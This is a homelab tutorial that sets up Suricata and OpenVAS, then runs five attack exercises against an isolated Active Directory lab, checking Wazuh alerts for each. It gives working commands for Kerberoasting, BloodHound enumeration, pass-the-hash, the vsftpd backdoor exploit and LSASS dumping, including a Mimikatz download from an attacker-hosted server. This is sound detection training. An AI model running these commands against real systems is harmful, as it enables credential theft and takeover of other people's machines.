# Steps 12–14 — Suricata, OpenVAS, Attack Exercises

---

# Step 12 — Suricata IDS/IPS on pfSense

## Why last?
Suricata in IPS mode can accidentally block your own traffic. Only enable it after everything else is confirmed working.

---

## 12.1 — Install Suricata

pfSense web UI → System → Package Manager → Available Packages:

Search: `suricata` → Install → Confirm.

---

## 12.2 — Configure Suricata on WAN

Services → Suricata → Interfaces → Add:

```
Interface:          WAN
Enable:             ✓ checked
Block Offenders:    ✓ checked    ← IPS mode
Which IP to Block:  Both
Kill States:        ✓ checked
Description:        WAN IPS
```

Save.

---

## 12.3 — Enable rulesets

Services → Suricata → Interfaces → WAN → Categories:

```
✓ Emerging Threats Open     ← free, good coverage
✓ Snort Community Rules
```

Services → Suricata → Updates → Update Rules (click the button).

Wait for download to complete (may take a few minutes).

---

## 12.4 — Start Suricata

Services → Suricata → Interfaces → click the green Start button next to WAN.

Check that it starts without errors.

---

## 12.5 — Verify internet still works

From your laptop:
```bash
ping 8.8.8.8
curl -I https://google.com
```

Both should work. If internet breaks, check Suricata logs:

Services → Suricata → Logs → WAN:
```
Look for: false positives blocking legitimate traffic
```

If something is being blocked incorrectly, suppress that rule in:
Services → Suricata → Interfaces → WAN → Suppress List → Add the rule SID.

---

## 12.6 — Verify Suricata alerts in Wazuh

Generate some test traffic:

```bash
# From laptop
nmap -sV 192.168.10.1
```

Check Wazuh dashboard → Security Events → you should see Suricata alerts for the scan.

---

## 12.7 — Screenshots for GitHub

Take screenshots of:
- Suricata interface running on WAN
- Alert log showing detected events
- Wazuh dashboard showing Suricata alerts

Save to:
```
homelab-portfolio/02-pfsense-firewall/screenshots/suricata-running.png
homelab-portfolio/02-pfsense-firewall/screenshots/suricata-alerts.png
```

---

# Step 13 — OpenVAS Vulnerability Scanner

## 13.1 — Create OpenVAS VM

In Proxmox web UI → Create VM:

```
VM ID:    204
Name:     openvas
OS:       Ubuntu 22.04 cloud image (clone template 9000)
          OR fresh install from ISO
CPU:      4 cores
RAM:      8192 MB     ← OpenVAS needs significant RAM
Disk:     60 GB
Network:  vmbr0, VLAN 30
IP:       192.168.30.30/24
Gateway:  192.168.30.1
```

**Easiest method — clone from template:**

Right-click VM 9000 (ubuntu-template) → Clone:
```
VM ID:     204
Name:      openvas
Mode:      Full Clone
```

After clone, start VM and set static IP:
```bash
# In VM console
nano /etc/netplan/00-installer-config.yaml
```

```yaml
network:
  version: 2
  ethernets:
    ens18:
      dhcp4: false
      addresses:
        - 192.168.30.30/24
      gateway4: 192.168.30.1
      nameservers:
        addresses:
          - 192.168.10.2
```

```bash
netplan apply
```

---

## 13.2 — Install Greenbone Community Edition (OpenVAS)

```bash
# In OpenVAS VM console
apt update && apt upgrade -y

# Install OpenVAS
apt install -y openvas

# Initial setup (takes 15-30 minutes — downloads vulnerability database)
gvm-setup

# After setup completes — note the admin password printed
# If you miss it:
gvm-script --gmp-username admin --gmp-password admin socket --socketpath /var/run/gvm/gvmd.sock --command 'get_version'

# Start services
gvm-start
```

Access web UI:
```
https://192.168.30.30:9392
```

Login:
```
Username: admin
Password: (printed by gvm-setup)
```

---

## 13.3 — Run scan against lab targets

In OpenVAS web UI → Scans → Tasks → New Task:

```
Name:           Lab vuln scan
Scan Config:    Full and Fast
Target:         Create new target
  Hosts:        10.10.10.0/24
  Name:         Cyber Lab
```

Click Create → Start scan.

The scan takes 15–45 minutes. When done:

Scans → Reports → click the completed scan → view findings sorted by severity.

---

## 13.4 — Document findings

Look for high and critical findings on Metasploitable (10.10.10.30) especially.

For at least 3 findings, document in a report:
```
Finding: vsftpd 2.3.4 Backdoor
CVSS:    10.0 (Critical)
Host:    10.10.10.30
Impact:  Remote code execution as root
Fix:     Upgrade vsftpd to patched version
```

Add this to your GitHub:
```
homelab-portfolio/08-wazuh-siem/incident-reports/
```

---

## 13.5 — Screenshots for GitHub

Take screenshots of:
- OpenVAS scan results dashboard showing vulnerability count
- A high-severity finding detail page
- Remediation report

Save to:
```
homelab-portfolio/07-cyber-lab/screenshots/openvas-results.png
```

---

# Step 14 — Run Attack Exercises

## Before every exercise

```bash
# In Proxmox shell — snapshot all lab VMs
qm snapshot 200 clean-state-pre-lab
qm snapshot 201 clean-state-pre-lab
qm snapshot 202 clean-state-pre-lab
qm snapshot 203 clean-state-pre-lab
```

---

## Exercise 1 — Kerberoasting (T1558.003)

**From Kali terminal:**

```bash
# Request TGS tickets for all service accounts
python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py \
  lab.local/jsmith:Password123! \
  -dc-ip 10.10.10.10 \
  -request \
  -outputfile /tmp/kerberoast-hashes.txt

cat /tmp/kerberoast-hashes.txt
```

You should see a hash starting with `$krb5tgs$23$*svc-sql*`

**Crack offline:**
```bash
hashcat -m 13100 /tmp/kerberoast-hashes.txt /usr/share/wordlists/rockyou.txt
```

**Check Wazuh dashboard:**
- Security Events → filter last 15 minutes
- Look for rule 100001: "Kerberoasting: RC4 TGS ticket requested for svc-sql"
- Screenshot the alert

**Fill in incident report:**
```
homelab-portfolio/08-wazuh-siem/incident-reports/IR-001-kerberoasting.md
```

---

## Exercise 2 — BloodHound AD Enumeration (T1087.002)

**From Kali:**

```bash
# Start neo4j database (needed for BloodHound)
sudo neo4j start
# Wait 30 seconds

# Collect AD data
bloodhound-python \
  -u jsmith \
  -p 'Password123!' \
  -d lab.local \
  -ns 10.10.10.10 \
  -c all \
  --zip

# Open BloodHound GUI
bloodhound &
```

In BloodHound:
- Login: neo4j / neo4j (change on first run)
- Upload data → drag the .zip file
- Run query: "Find Shortest Paths to Domain Admins"
- Screenshot the attack path graph

**Check Wazuh:**
- Rule 100002 should fire for LDAP enumeration
- Screenshot the alert

**Fill in:**
```
homelab-portfolio/08-wazuh-siem/incident-reports/IR-003-bloodhound.md
```

---

## Exercise 3 — Pass-the-Hash (T1550.002)

**From Kali — first get a hash:**

```bash
# Dump credentials from Win10 (need admin access first)
# Option: use secretsdump after Kerberoasting gives you DC access
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py \
  lab.local/Administrator:Lab@Password123!@10.10.10.10

# Use a hash to authenticate without the password
python3 /usr/share/doc/python3-impacket/examples/psexec.py \
  -hashes :NTLMHASH_FROM_ABOVE \
  administrator@10.10.10.10
```

**Check Wazuh:**
- Rule 100003: NTLM network logon event
- Event ID 4624 logon type 3

**Fill in:**
```
homelab-portfolio/08-wazuh-siem/incident-reports/IR-002-pass-the-hash.md
```

---

## Exercise 4 — Metasploit vsftpd Backdoor (T1190)

**From Kali:**

```bash
msfconsole

use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 10.10.10.30
run
```

You should receive a root shell:
```bash
whoami
# root
id
```

**Check Wazuh:**
- Suricata alert for vsftpd exploit
- Screenshot the alert and the root shell

**Fill in:**
```
homelab-portfolio/08-wazuh-siem/incident-reports/IR-004-vsftpd.md
```

---

## Exercise 5 — LSASS Credential Dump (T1003.001)

**From Kali — after gaining access to Win10:**

```bash
# Using Impacket to run Mimikatz remotely (after you have admin)
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py \
  LAB/Administrator:Lab@Password123!@10.10.10.20
```

Or from inside Win10 (Proxmox console):
```powershell
# Download and run Mimikatz
Invoke-WebRequest -Uri "http://10.10.10.5:8000/mimikatz.exe" -OutFile C:\mimikatz.exe
# (first serve it from Kali with: python3 -m http.server 8000)

C:\mimikatz.exe
# Inside mimikatz:
privilege::debug
sekurlsa::logonpasswords
```

**Check Wazuh:**
- Rule 100006: LSASS handle access — level 15 alert
- Screenshot the critical alert

**Fill in:**
```
homelab-portfolio/08-wazuh-siem/incident-reports/IR-005-lsass-dump.md
```

---

## After every exercise — roll back VMs

```bash
# In Proxmox shell
qm rollback 200 clean-state
qm rollback 201 clean-state
qm rollback 202 clean-state
qm rollback 203 clean-state
```

---

## Commit all evidence to GitHub

```bash
cd ~/homelab-portfolio

# Add all screenshots and incident reports
git add 07-cyber-lab/screenshots/
git add 08-wazuh-siem/incident-reports/
git add 08-wazuh-siem/screenshots/

git commit -m "Add attack exercise evidence — Kerberoasting, PTH, BloodHound, vsftpd, LSASS"
git push
```

---

## You are done

Your complete homelab is built. Every section of the GitHub repo is documented with working evidence. You have:

- Enterprise network with VLAN segmentation
- Edge firewall with IDS/IPS
- Encrypted DNS
- Full virtualization stack
- Isolated AD attack/defense lab
- SIEM with MITRE ATT&CK mapped detection rules
- 5 documented incident response exercises
- Zero-trust remote access

This portfolio puts you in a strong position for SOC Analyst, Systems Administrator, and IT Security Analyst roles at $75–95k+.
